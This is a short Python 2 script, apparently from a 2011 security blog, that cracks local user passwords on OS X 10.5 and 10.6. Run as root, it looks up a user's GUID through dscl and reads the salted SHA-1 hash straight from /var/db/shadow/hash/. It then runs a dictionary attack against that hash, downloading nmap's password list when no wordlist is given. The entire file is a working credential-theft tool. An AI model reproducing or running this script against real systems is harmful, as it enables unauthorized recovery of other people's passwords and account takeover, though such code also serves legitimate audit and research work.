#***************************************************
#***************************************************
#* Used for cracking OS X passwords on 10.5 and 10.6
#* Must have UID O!
#* Usage: osx_crack.py <username> [dictionary]
#*
#* Patrick Dunstan
#* http://www.defenceindepth.net
#* 2011
#***************************************************
#***************************************************

from subprocess import *
import hashlib
import os
import urllib2
import sys

link = "http://nmap.org/svn/nselib/data/passwords.lst" # ONLINE PASSWORD FILE

def check(password): # HASH PASS AND COMPARE
		
	if not password.startswith("#!"): #IGNORE COMMENTS

		create_sha1 = hashlib.sha1(salt_hex + password)
		sha1_guess = create_sha1.hexdigest()
		print("Trying... " + password)
	
		if sha1 in sha1_guess.upper():
			print("Cleartext password for user '"+username+"' is : "+password)
			exit(0)

if len(sys.argv) < 2:
	print("Usage: " + sys.argv[0] + " <username> [dictionary]")
	exit(0)

username = sys.argv[1]

p = Popen("dscl localhost -read /Search/Users/" + username, shell=True, stdout=PIPE) #PULL USER INFORMATION FROM DIRECTORY SERVICES
dscl_out = p.communicate()[0]

if "GeneratedUID" not in dscl_out:
	print("ERROR: User appears not to exist. Exiting.")
	exit(0)

list = dscl_out.split("\n")
guid = list[10].split(" ")

p = Popen("cat /var/db/shadow/hash/" + guid[1], shell=True, stdout=PIPE) #PULL HASH FROM SHADOW FILE
digest = p.communicate()[0]

salt = digest[168:176] # TAKE 4 BYTE SALT FROM FRONT
sha1 = digest[177:216] # TAKE REMAINING BYTES FOR HASH

print("Attempting to crack...  " + salt + sha1)

try:
	salt_hex =  chr(int(salt[0:2], 16)) + chr(int(salt[2:4], 16)) + chr(int(salt[4:6], 16)) + chr(int(salt[6:8], 16)) # CONVERT SALT TO HEX 

except ValueError:
	print("ERROR: Problem converting salt.")	
	exit(0)

if len(sys.argv) == 3: # IF DICTIONARY FILE SPECIFIED
	print("Reading from dictionary file '"+sys.argv[2]+"'.")
	passlist = open(sys.argv[2], "r")
	password = passlist.readline()

	while password:
		check(password.rstrip())
		password = passlist.readline()
	passlist.close()

else: # NO DICTIONARY FILE SPECIFIED
	print("No dictionary file specified. Defaulting to hard coded link.")
	passlist = urllib2.urlopen(link) # DOWNLOAD DICTIONARY FILE
	passwords = passlist.read().split("\n")

	for password in passwords:
		check(password)


print("\nPassword not found. Try a different dictionary :)")
